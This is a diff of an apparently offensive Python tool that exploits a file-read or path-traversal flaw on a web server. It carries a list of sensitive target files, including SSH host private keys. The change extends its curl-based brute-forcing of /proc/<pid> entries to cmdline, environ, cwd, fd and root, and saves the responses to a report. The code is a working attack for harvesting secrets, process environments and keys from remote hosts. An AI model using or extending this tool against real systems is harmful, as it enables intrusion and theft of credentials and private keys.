@@ -29,7 +29,7 @@ commonFiles = [	"/etc/issue","/proc/version","/etc/profile","/etc/bashrc", "~/.b
 				"/etc/ssh/ssh_config", "/etc/ssh/sshd_config","/etc/ssh/ssh_host_dsa_key.pub", "/etc/ssh/ssh_host_dsa_key",
 			 	"/etc/ssh/ssh_host_rsa_key.pub", "/etc/ssh/ssh_host_rsa_key", "/etc/ssh/ssh_host_key.pub", "/etc/ssh/ssh_host_key"]
 
-
+procNames = ["cmdline","cwd","environ","fd","root"]
 
 Header = BLUE + BOLD + """
 ===============================================================================================================================
@@ -62,21 +62,22 @@ if __name__ == "__main__":
 		with open('vulnUrl.txt','w') as file:
 			file.write(url) 
 
-	if sys.argv[-1] == "--brute-force-cmdline" or sys.argv[-1] == "-bfc":
+	if sys.argv[-1] == "--brute-force-proc" or sys.argv[-1] == "-bf":
 		with open("trReport.txt","w") as file:
 			for i in range(int(sys.argv[-2])):
 				if i == 0:
 					PID = "self"
 				else:
 					PID = i
-				command = "curl -s {}/proc/{}/cmdline".format(url, i)
-				print_with_colors("Getting the content of the file: {}/proc/{}/cmdline                         ".format(url, PID),BLUE, end='\r')
-				result = os.popen(command).read()
-				if result.strip() != '':
-					print("\nFound something !")
-					file.write(BLUE + "\nContent of the file:/proc/{}/cmdline\n===========================\n".format(url, i) + ENDC)
-					file.write(result)
-					os.fsync(file.fileno())
+				for entry in procNames:
+					command = "curl -s {}/proc/{}/{}".format(url, PID, entry)
+					print_with_colors("Getting the content of the file: /proc/{}/{}                        ".format(PID, entry),BLUE, end='\r')
+					result = os.popen(command).read()
+					if result.strip() != '':
+						print("\nFound something !")
+						file.write(BLUE + "\nContent of the file:/proc/{}/{} \n===========================\n".format(PID, entry) + ENDC)
+						file.write(result)
+						file.flush()
 
 
 
